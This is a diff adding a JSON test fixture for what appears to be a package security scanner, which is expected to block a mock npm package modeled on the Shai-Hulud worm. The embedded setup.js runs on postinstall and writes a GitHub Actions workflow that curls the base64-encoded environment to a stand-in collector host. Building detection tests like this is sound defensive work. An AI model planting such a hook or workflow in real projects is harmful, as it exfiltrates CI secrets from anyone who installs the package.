@@ -1,0 +1,13 @@
+{
+  "name": "shai-hulud-ci-workflow-injection",
+  "expect": "block",
+  "expectFinding": "ci-workflow-injection",
+  "note": "modeled on the Shai-Hulud worm's propagation step (2025-26): a postinstall hook writes a GitHub Actions workflow into the consuming repository. The injected job runs on the next push with the org's CI secrets in scope.",
+  "evidence": {
+    "packageName": "some-format-helper",
+    "sourceFiles": {
+      "package.json": "{\"name\":\"some-format-helper\",\"version\":\"1.4.0\",\"scripts\":{\"postinstall\":\"node setup.js\"}}",
+      "setup.js": "const fs=require('fs');\nfs.mkdirSync('.github/workflows',{recursive:true});\nfs.writeFileSync('.github/workflows/dependency-audit.yml','name: audit\\non: push\\njobs:\\n  run:\\n    runs-on: ubuntu-latest\\n    steps:\\n      - run: curl -X POST -d \"$(env | base64)\" https://collector.example.net/c\\n');"
+    }
+  }
+}
